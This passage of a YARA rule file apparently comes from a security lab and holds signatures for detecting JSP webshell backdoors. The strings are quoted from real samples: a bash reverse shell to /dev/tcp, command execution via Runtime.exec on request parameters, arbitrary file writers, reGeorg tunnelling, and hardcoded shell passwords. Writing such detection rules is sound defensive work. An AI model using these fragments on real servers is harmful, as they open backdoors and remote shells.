        $s17 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s18 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\">&nbsp;8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-ser" fullword ascii
        $s19 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s20 = "<TD align=\"right\"><FONT color=\"#d2d8ec\"><b>JFolder</b>_By_<b>hack520</b></FONT></TD>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_2eae1d5632e22ac9da64bfdea30ed16876f08af5
{
    meta:
        description = "jsp - file 2eae1d5632e22ac9da64bfdea30ed16876f08af5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6d84a1c143df661604a7ce0d10963fe574a78c2b2b27113906d93c0bf532b1d9"
    strings:
        $s1 = "<%try { Runtime run = Runtime.getRuntime(); run.exec(\"bash -i >& /dev/tcp/123.45.67.89/9999 0>&1\"); } catch (IOException e) { " ascii
        $s2 = "<%try { Runtime run = Runtime.getRuntime(); run.exec(\"bash -i >& /dev/tcp/123.45.67.89/9999 0>&1\"); } catch (IOException e) { " ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s04
{
    meta:
        description = "jsp - file s04.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
    strings:
        $s1 = "private static final String PW = \"shell007\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule ac91e5b9b9dcd373eaa9360a51aa661481ab9429
{
    meta:
        description = "jsp - file ac91e5b9b9dcd373eaa9360a51aa661481ab9429.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bddf1cba938dfa8e6a513a7a7fb35b971229fb6ee808751621a743a357592070"
    strings:
        $s1 = "<%new java.io.RandomAccessFile(request.getParameter(\"f\"),\"rw\").write(request.getParameter(\"c\").getBytes()); %>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_kkll
{
    meta:
        description = "jsp - file kkll.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "79eb88e00141f739c8dfb89c4e9a266a2560edf72b9352ab24862c7451519a10"
    strings:
        $x1 = "->||<-<%@ page import=\"java.util.*,java.io.*\"%> <% %> <HTML><BODY> Commands with JSP <FORM METHOD=\"GET\" NAME=\"myform\" ACTI" ascii
        $x2 = "ut.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter" ascii
        $s3 = "tring disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>" fullword ascii
        $s4 = "->||<-<%@ page import=\"java.util.*,java.io.*\"%> <% %> <HTML><BODY> Commands with JSP <FORM METHOD=\"GET\" NAME=\"myform\" ACTI" ascii
        $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != " ascii
    condition:
        ( uint16(0) == 0x3e2d and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule d51d367159c1a4f72ea64f0c2d160c8204cdf29e
{
    meta:
        description = "jsp - file d51d367159c1a4f72ea64f0c2d160c8204cdf29e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
    strings:
        $s1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009</a></span>\"+re" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s5 = "\"<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2012 Admin </span><a href=\\\"http://www.baidu.com\\\" target=\\\"_bla" ascii
        $s6 = "\">Copyright (C) 2009 <a href=\\\"http://www.baidu.com\\\" target=\\\"_blank\\\">http://www.baidu.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s7 = "\" href=\\\"http://www.baidu.com/\\\">[T00ls.Net]</a> All Rights Reserved.\"+" fullword ascii
        $s8 = "out.println(\"<html><head><title> </title><style type=\\\"text/css\\\">\"+" fullword ascii
        $s9 = "idu.com</a></p>\"+" fullword ascii
        $s10 = "private static final String PW = \"k8\"; " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule d99b32ab6dc6a0b437bbcfb6ff5c25b73e715372
{
    meta:
        description = "jsp - file d99b32ab6dc6a0b437bbcfb6ff5c25b73e715372.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0515cd2ba84a5da10c63cadae06f04d778d66c054b9184edb57be6ea95a1095b"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));" fullword ascii
        $s2 = "// cmd.jsp = Command Execution (unix)" fullword ascii
        $s3 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword ascii
        $s4 = "if (request.getParameter(\"cmd\") != null) {" fullword ascii
        $s5 = "<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">" fullword ascii
        $s6 = "InputStream in = p.getInputStream();" fullword ascii
        $s7 = "OutputStream os = p.getOutputStream();" fullword ascii
        $s8 = "<INPUT TYPE=\"text\" NAME=\"cmd\">" fullword ascii
        $s9 = "<%@ page import=\"java.util.*,java.io.*\"%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_7eaf0de0982a9ebc07630aa15e1fc6270b7d73d8
{
    meta:
        description = "jsp - file 7eaf0de0982a9ebc07630aa15e1fc6270b7d73d8.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
    strings:
        $s1 = "private static final String PW = \"mr.wei\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule de31b3222630eb5450177b27005c0e031f667df5
{
    meta:
        description = "jsp - file de31b3222630eb5450177b27005c0e031f667df5.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "65ec82ca332b5540dc21597958820679c28a2bb024f1a8b30ce39e0701435999"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getReq" fullword ascii
        $s2 = ":</font><input type=\"text\" size=\"70\" name=\"path\" value=\"<%out.print(getServletContext().getRealPath(\"/\")); %>\">    " fullword ascii
        $s3 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"utf8\");    " fullword ascii
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"utf8\");    " fullword ascii
        $s5 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getRequestUR" ascii
        $s6 = "<form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
        $s7 = ":</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
        $s8 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule sig_91cf96c983ad2efaca225a1050e1607f3e7c5e03
{
    meta:
        description = "jsp - file 91cf96c983ad2efaca225a1050e1607f3e7c5e03.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2010 </a></span>\"+r" ascii
        $s3 = "response.getWriter().println(\"<div style=\\\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#ee" ascii
        $s4 = "\">Copyright (C) 2010 <a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">http://www.Forjj.com/</a>&nbsp;&nbsp;<a target=" ascii
        $s5 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s6 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2010 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</span>\");" fullword ascii
        $s8 = "JSession.setAttribute(MSG,\"<span style='color:green'>Upload File Success!</span>\");" fullword ascii
        $s9 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName());" fullword ascii
        $s10 = "private static final String PW = \"whoami\"; //password" fullword ascii
        $s11 = "oString()+\"/exportdata.txt\")+\"\\\" size=\\\"100\\\" class=\\\"input\\\"/>\"+" fullword ascii
        $s12 = "der(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!window.c" ascii
        $s13 = "\" <input type=\\\"submit\\\" class=\\\"bt\\\" value=\\\"Export\\\"/><br/><br/>\"+BACK_HREF+\"</td>\"+" fullword ascii
        $s14 = "* CY . I Love You." fullword ascii
        $s15 = "* by n1nty" fullword ascii
        $s16 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s17 = "dData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText));alert" ascii
        $s18 = "/option><option value='ISO-8859-1'>ISO-8859-1</option></select>\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b33181d4e25c844360ac8bcb0630c3ccc0819100
{
    meta:
        description = "jsp - file b33181d4e25c844360ac8bcb0630c3ccc0819100.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4b271359de0e0becb65f842c7a4b72409efa5488700f07a744f8b6d3b65be1af"
    strings:
        $s1 = "page.modules = $().add(page.loginDialog).add(page.fileTable);" fullword ascii
        $s2 = "tryTime.find('.times').text(parseInt(result.data[\"max-try\"]) - parseInt(result.data['try-time']));" fullword ascii
        $s3 = "page.logoutLink.text('Logout ' + result.data['username']);" fullword ascii
        $s4 = "<script src=\"https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js\"></script>" fullword ascii
        $s5 = "<script src=\"https://cdn.bootcss.com/jquery.form/3.51/jquery.form.min.js\"></script>" fullword ascii
        $s6 = "<script src=\"https://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js\"></script>" fullword ascii
        $s7 = "<script src=\"https://cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script>" fullword ascii
        $s8 = "<link href=\"https://cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\" rel=\"stylesheet\"/>" fullword ascii
        $s9 = "<script src=\"https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script>" fullword ascii
        $s10 = "result.data = page.processDataXML(result.dataElement);" fullword ascii
        $s11 = "$(document).on('click', 'table.table tr.type-file a.btn-view, table.table tr.type-file a.btn-download', function (e) {" fullword ascii
        $s12 = "<input type=\"submit\" name=\"login-submit\" id=\"login-submit\" tabindex=\"3\"" fullword ascii
        $s13 = "page.loginDialog = $('#login-dialog');" fullword ascii
        $s14 = "<form id=\"login-form\" method=\"post\" role=\"form\">" fullword ascii
        $s15 = "page.processResponseXML = function (response, status, xhr) {" fullword ascii
        $s16 = "$.get(href, {_x: 1, _a: 'logout'}, function (response, status, xhr) {" fullword ascii
        $s17 = "var alert = page.loginDialog.find('.alert');" fullword ascii
        $s18 = "$.get(row.data('delete_url'), function (response, status, xhr) {" fullword ascii
        $s19 = "row.find('td label span').html('<a href=\"javascript:;\">[' + e.name + ']</a>');" fullword ascii
        $s20 = "<input type=\"password\" name=\"password\" id=\"password\" tabindex=\"2\"" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 80KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1488207531
{
    meta:
        description = "jsp - file 1488207531.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "29f43afdb6104ae0dc2176f44035d98a0b85e6989257c24a0aa9004243a3d729"
    strings:
        $x1 = "->||<-<%@ page import=\"java.util.*,java.io.*\"%> <% %> <HTML><BODY> Commands with JSP <FORM METHOD=\"GET\" NAME=\"myform\" ACTI" ascii
        $x2 = "ut.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\"); Process p = Runtime.getRuntime().exec(request.getParameter" ascii
        $s3 = "tring disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>" fullword ascii
        $s4 = "->||<-<%@ page import=\"java.util.*,java.io.*\"%> <% %> <HTML><BODY> Commands with JSP <FORM METHOD=\"GET\" NAME=\"myform\" ACTI" ascii
        $s5 = "<INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"> </FORM> <pre> <% if (request.getParameter(\"cmd\") != " ascii
    condition:
        ( uint16(0) == 0x3e2d and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule c6a8ac7f441e8838e113c40041e7ad0808d5fc1d
{
    meta:
        description = "jsp - file c6a8ac7f441e8838e113c40041e7ad0808d5fc1d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s7 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s8 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s9 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s11 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s12 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s13 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s14 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s15 = ".charAt(i + 1))));" fullword ascii
        $s16 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
        $s17 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s18 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
        $s19 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
        $s20 = "void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule sig_57a8da83b98e475c79f90c50696142f713244e1e
{
    meta:
        description = "jsp - file 57a8da83b98e475c79f90c50696142f713244e1e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "702fb236f525c348fcb3f95053b20a2df946db38e4d2b007a6314606c8f5cc46"
    strings:
        $x1 = "Process proc = rt.exec(\"cmd.exe\");" fullword ascii
        $s2 = "<h1>JSP Backdoor Reverse Shell</h1>" fullword ascii
        $s3 = "String ipAddress = request.getParameter(\"ipaddress\");" fullword ascii
        $s4 = "page import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"" fullword ascii
        $s5 = "String ipPort = request.getParameter(\"port\");" fullword ascii
        $s6 = "Runtime rt = Runtime.getRuntime();" fullword ascii
        $s7 = "proc.getOutputStream());" fullword ascii
        $s8 = "sock.getOutputStream());" fullword ascii
        $s9 = "while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)" fullword ascii
        $s10 = "new StreamConnector(proc.getInputStream()," fullword ascii
        $s11 = "new StreamConnector(sock.getInputStream()," fullword ascii
        $s12 = "sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());" fullword ascii
        $s13 = "isr = new BufferedReader(new InputStreamReader(is));" fullword ascii
        $s14 = "<input type=\"text\" name=\"ipaddress\" size=30>" fullword ascii
        $s15 = "osw.write(buffer, 0, lenRead);" fullword ascii
        $s16 = "<input type=\"text\" name=\"port\" size=10>" fullword ascii
        $s17 = "if(ipAddress != null && ipPort != null)" fullword ascii
        $s18 = "<input type=\"submit\" name=\"Connect\" value=\"Connect\">" fullword ascii
    condition:
        ( uint16(0) == 0x2f2f and filesize < 6KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3
{
    meta:
        description = "jsp - file b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f13923c9a06e8526027e2ebf7f854dbee729b259f35e8c3813d6916a171044d4"
    strings:
        $x1 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
        $x2 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
        $x3 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
        $x4 = "process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
        $s5 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
        $s6 = "String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
        $s7 = "out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
        $s8 = "out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
        $s9 = "out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
        $s10 = "out.print(\"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + nowURI +\"\\\" />\\n\");" fullword ascii
        $s11 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s12 = "out.print(\"<TR><TD height=20><A href=\\\"?action=q\\\" target=FileFrame>" fullword ascii
        $s13 = "out.print(\"<TR><TD height=20><A href=\\\"?action=G\\\" target=FileFrame>" fullword ascii
        $s14 = "if(request.getParameter(\"pass\")!=null&&request.getParameter(\"pass\").equals(passWord)){" fullword ascii
        $s15 = "out.print(\"<TR><TD height=20><A href='?action=t' target=FileFrame>" fullword ascii
        $s16 = "out.print(\"<CENTER><A href=\\\"\\\" target=_blank><FONT color=red></FONT></CENTER></A>\");" fullword ascii
        $s17 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
        $s18 = "res.setHeader(\"Content-disposition\",\"attachment;filename=\\\"\"+fName+\"\\\"\");" fullword ascii
        $s19 = "out.print(\"<A href='\"+\"javascript:JshowFolder(\\\"\"+convertPath(roots[i].getPath())+\"\\\")'>" fullword ascii
        $s20 = "public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7c0cc71e28f6bab535f516ff035a0c1117261801
{
    meta:
        description = "jsp - file 7c0cc71e28f6bab535f516ff035a0c1117261801.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
    strings:
        $x1 = "<center><a href=\"http://www.cnhonkerarmy.com\" target=\"_blank\">www.cnhonkerarmy.com</a> ,All Rights Reserved." fullword ascii
        $s2 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s3 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s4 = "1251924328@Gmail.com" fullword ascii
        $s5 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s6 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s7 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s8 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s9 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s10 = "//out.println(path + f1.getName());" fullword ascii
        $s11 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
        $s12 = "out.println(\"error,upload \");" fullword ascii
        $s13 = "String strOS = System.getProperty(\"os.name\").toLowerCase();" fullword ascii
        $s14 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword ascii
        $s15 = "String strPath = strDir + strSeparator + strFile; " fullword ascii
        $s16 = "strDir = request.getRealPath(\".\");" fullword ascii
        $s17 = "strDir = strDir + strSeparator;" fullword ascii
        $s18 = "String strThisFile=\"JFileMan.jsp\";" fullword ascii
        $s19 = "path = path + strSeparator;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9f1df0249a6a491cdd5df598d83307338daa4c43
{
    meta:
        description = "jsp - file 9f1df0249a6a491cdd5df598d83307338daa4c43.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1c653b03dc9eeaaca575349abd5de579ef48b8fa17af6cce24fb706d7e7a87b8"
    strings:
        $s1 = "<%java.util.logging.Logger l=java.util.logging.Logger.getLogger(\"t\");java.util.logging.FileHandler h=new java.util.logging.Fil" ascii
        $s2 = "<%java.util.logging.Logger l=java.util.logging.Logger.getLogger(\"t\");java.util.logging.FileHandler h=new java.util.logging.Fil" ascii
        $s3 = "andler(pageContext.getServletContext().getRealPath(\"/\")+request.getParameter(\"f\"),true);h.setFormatter(new java.util.logging" ascii
        $s4 = "pleFormatter());l.addHandler(h);l.info(request.getParameter(\"t\"));%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9c2d0a4f5d47b78e10c8bc246a7a236359bc2952
{
    meta:
        description = "jsp - file 9c2d0a4f5d47b78e10c8bc246a7a236359bc2952.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
    strings:
        $s1 = "</font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.7jyewu.cn </font>\"};" fullword ascii
        $s2 = "<center><a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a> ,All Rights Reserved." fullword ascii
        $s3 = "<a href=\"http://www.7jyewu.cn\" target=\"_blank\">http://www.7jyewu.cn/</a></b>" fullword ascii
        $s4 = "<br>Any question, please email me admin@syue.com" fullword ascii
        $s5 = "<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>" fullword ascii
        $s6 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s7 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s8 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
        $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('del','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"','" ascii
        $s10 = "sbFile.append(\"\"+list[i].getName()); " fullword ascii
        $s11 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
        $s12 = "<%@ page contentType=\"text/html;charset=utf8\"%>" fullword ascii
        $s13 = "response.setContentType(\"APPLICATION/OCTET-STREAM\"); " fullword ascii
        $s14 = "<title>JSP Shell " fullword ascii
        $s15 = "sbCmd.append(line+\"\\r\\n\");  " fullword ascii
        $s16 = "sbEdit.append(htmlEncode(line)+\"\\r\\n\");  " fullword ascii
        $s17 = "private final static int languageNo=0; //" fullword ascii
        $s18 = "))+\"','','\"+strCmd+\"','1','');\\\">\");" fullword ascii
        $s19 = "request.setCharacterEncoding(\"utf8\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them ) ) or ( all of them )
}

rule c59221b4af6a1faeab6deb64fea827acdd9bc91b
{
    meta:
        description = "jsp - file c59221b4af6a1faeab6deb64fea827acdd9bc91b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
    strings:
        $s1 = "private static final String PW = \"admin\"; " fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_30fc7ea6d4f7cde66043113e38213361621704b7
{
    meta:
        description = "jsp - file 30fc7ea6d4f7cde66043113e38213361621704b7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
    strings:
        $s1 = "private static final String PW = \"kity\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_650eaa21f4031d7da591ebb68e9fc5ce5c860689
{
    meta:
        description = "jsp - file 650eaa21f4031d7da591ebb68e9fc5ce5c860689.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b963b8b8c5ca14c792d2d3c8df31ee058de67108350a66a65e811fd00c9a340c"
    strings:
        $s1 = "socketChannel.connect(new InetSocketAddress(target, port));" fullword ascii
        $s2 = "https://github.com/sensepost/reGeorg" fullword ascii
        $s3 = "etienne@sensepost.com / @kamp_staaldraad" fullword ascii
        $s4 = "IOException, java.net.UnknownHostException, java.net.Socket\" trimDirectiveWhitespaces=\"true\"%><%" fullword ascii
        $s5 = "} else if (cmd.compareTo(\"FORWARD\") == 0){" fullword ascii
        $s6 = "System.out.println(e.getMessage());" fullword ascii
        $s7 = "System.out.println(ex.getMessage());" fullword ascii
        $s8 = "sam@sensepost.com / @trowalts" fullword ascii
        $s9 = "int readlen = request.getContentLength();" fullword ascii
        $s10 = "willem@sensepost.com / @_w_m__" fullword ascii
        $s11 = "} else if (cmd.compareTo(\"READ\") == 0){" fullword ascii
        $s12 = "request.getInputStream().read(buff, 0, readlen);" fullword ascii
        $s13 = "SocketChannel socketChannel = (SocketChannel)session.getAttribute(\"socket\");" fullword ascii
